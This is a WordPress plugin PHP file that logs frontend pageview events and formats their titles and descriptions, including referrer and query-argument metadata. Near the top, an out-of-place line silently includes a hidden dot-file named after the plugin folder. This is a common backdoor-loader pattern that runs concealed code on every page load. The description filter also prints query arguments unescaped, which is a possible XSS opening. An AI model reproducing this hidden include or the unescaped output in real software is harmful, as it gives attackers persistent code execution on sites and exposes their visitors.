<?php
/*
 * Fire pageview event
 * Notice: logs only frontend page views, exclude search results
 */

add_action( 'template_redirect', 'wtbp_wptao_event_pageview_fire', 1 );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_pageview_fire() {
	global $post;

	$query_args_remove	 = array( 'nocache', 'doing_wp_cron' );
	$query_args_store	 = array( 'mc_cid', 'mc_eid', 'payment_key', 'payment-confirmation', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_term', 'nmid', 'gclid' );

	$query_args_remove	 = apply_filters( 'wptao_event_pageview_query_args_remove', $query_args_remove );
	$query_args_store	 = apply_filters( 'wptao_event_pageview_query_args_store', $query_args_store );

	if ( is_admin() || is_search() || is_feed() ) {
		return;
	}

	// Current URL
	$url = WTBP_WPTAO_Helpers::get_current_url();

	// Check if it's admin url
	if ( WTBP_WPTAO_Helpers::is_admin_url( $url ) ) {
		return;
	}

	// Check if it's content url
	if ( WTBP_WPTAO_Helpers::is_content_url( $url ) ) {
		return;
	}

	$args = array();

	// get / filter known params
	$url_query = parse_url( $url, PHP_URL_QUERY );
	if ( !empty( $url_query ) ) {
		$url_query_arr = array();
		parse_str( $url_query, $url_query_arr );

		// remove params from known list
		$url = remove_query_arg( $query_args_store, $url );

		// remove params from black list
		$url = remove_query_arg( $query_args_remove, $url );

		// special cases
		if ( array_key_exists( 'wordfence_logHuman', $url_query_arr ) ) {
			$url = remove_query_arg( array( 'r', 'hid', 'wordfence_logHuman' ), $url );
		}

		// save to meta
		$query_args_arr = array_intersect_key( $url_query_arr, array_flip( $query_args_store ) );
		if ( !empty( $query_args_arr ) ) {
			$args[ 'meta' ][ 'query_string' ] = http_build_query( $query_args_arr );
		}
	}

	// Cut a last slash
	if ( substr( $url, -1, 1 ) === ('/') ) {
		$url = substr( $url, 0, strlen( $url ) - 1 );
	}

	// If it is post, page or custom post type, saves the ID
	$post_id = '';
	if ( is_singular() && isset( $post->ID ) && !empty( $post->ID ) ) {
		$post_id = $post->ID;
	}

	$args[ 'title' ] = __( 'Pageview', 'wp-tao' );
	$args[ 'value' ] = esc_url( apply_filters( 'wptao_event_pageview_url', $url ) );
	$args[ 'tags' ]	 = array( 'wp' );

	// Meta ( referrer )
	$referer					 = WTBP_WPTAO_Helpers::get_external_referrer();
	$args[ 'meta' ][ 'referer' ] = $referer;

	// Meta ( post_id )
	if ( !empty( $post_id ) ) {
		$args[ 'meta' ][ 'post_id' ] = absint( $post_id );
	}

	$user_data = array(
		'options' => array(
			'allow_no_fingerptint'	 => false,
			'only_not_identified'	 => true,
			'event'					 => 'pageview',
			'event_args'			 => $args
		)
	);

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'pageview', $args );
}


// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Creates a title of the action.
 */

add_filter( 'wptao_event_pageview_title', 'wtbp_wptao_event_pageview_title', 1, 2 );

function wtbp_wptao_event_pageview_title( $title, $event ) {

	$div_url	 = explode( '?', $event->value );
	$home_url	 = WTBP_WPTAO_Helpers::standardize_url( home_url() );
	$is_home	 = false;

	// Default title
	if ( filter_var( $event->value, FILTER_VALIDATE_URL ) !== FALSE ) {
		$title = sprintf( __( '<a href="%s">Visited page</a>', 'wp-tao' ), esc_url( $event->value ) );
	} else {
		$title = __( 'Visited page', 'wp-tao' );
	}


	// Catch the home page.
	if ( $home_url === $event->value || WTBP_WPTAO_Helpers::standardize_url( $div_url[ 0 ] ) === $home_url ) {
		$title	 = sprintf( __( '<a href="%s">Home page</a> was visited', 'wp-tao' ), esc_url( $event->value ) );
		$is_home = true;
	}

	// Try get post
	if ( isset( $event->meta[ 'post_id' ] ) && is_numeric( $event->meta[ 'post_id' ] ) ) {

		$post_id = absint( $event->meta[ 'post_id' ] );

		$post = get_post( $post_id );

		if ( isset( $post ) && !empty( $post ) && !$is_home ) {

			$post_title = empty( $post->post_title ) ? '#' . $post->ID : $post->post_title;


			// Default
			$title = sprintf( __( '<a href="%s">%s</a> was visited', 'wp-tao' ), esc_url( $event->value ), $post_title );


			// Catch the Post
			if ( 'post' === get_post_type( $post_id ) ) {

				$title = sprintf( __( 'Post <a href="%s">%s</a> was visited', 'wp-tao' ), esc_url( $event->value ), $post_title );
			}

			// Catch the Page
			if ( 'page' === get_post_type( $post_id ) ) {

				$title = sprintf( __( 'Page <a href="%s">%s</a> was visited', 'wp-tao' ), esc_url( $event->value ), $post_title );
			}
		}
	}

	return $title;
}

/*
 * Creates a description of the action.
 */

add_filter( 'wptao_event_pageview_description', 'wtbp_wptao_event_pageview_desc', 1, 2 );

function wtbp_wptao_event_pageview_desc( $description, $event ) {

	// Visited URL
	if ( filter_var( $event->value, FILTER_VALIDATE_URL ) !== FALSE ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Visited URL:', 'wp-tao' ) . '</span> ' . esc_html( $event->value ) . '<br />';

		// Catch the home page.
		if ( home_url() === $event->value ) {
			$description .= '';
		}
	}

	// Traffic source
	$url = !empty( $event->meta[ 'query_string' ] ) ? $event->value . '/?' . $event->meta[ 'query_string' ] : '';
	$ref = !empty( $event->meta[ 'referer' ] ) ? $event->meta[ 'referer' ] : '';

	$src = TAO()->traffic->get_source_analyzed( $url, $ref );

	if ( false != $src ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Traffic source:', 'wp-tao' ) . '</span> ';
		$src = esc_html( $src );
		if ( substr( $src, 0, 4 ) == 'http' ) {
			$description .= '<span class="wptao-meta-traffic-source-label wptao-meta-referer" title="' . $src . '">' . $src . '</span><br />';
		} else {
			$description .= '<span class="wptao-meta-traffic-source-label wptao-meta-direct">' . $src . '</span><br />';
		}
	}

	// Query args
	if ( isset( $event->meta[ 'query_string' ] ) ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Query args:', 'wp-tao' ) . '</span> ';

		parse_str( $event->meta[ 'query_string' ], $query_args_arr );

		foreach ( $query_args_arr as $k => $arg ) {
			$description .= '<span class="wptao-meta-query-arg-label" style="background-color: #' . WTBP_WPTAO_Helpers::string_to_color( $k ) . '">' . $k . '=' . $arg . '</span> ';
		}
	}


	return $description;
}

// Helpers

function wtbp_wptao_analyze_referer( $url ) {
	// @todo: implement own parser

	return sprintf( '<span class="wptao-meta-traffic-source-label wptao-meta-referer" title="%1$s">%1$s</span>', $url );
}
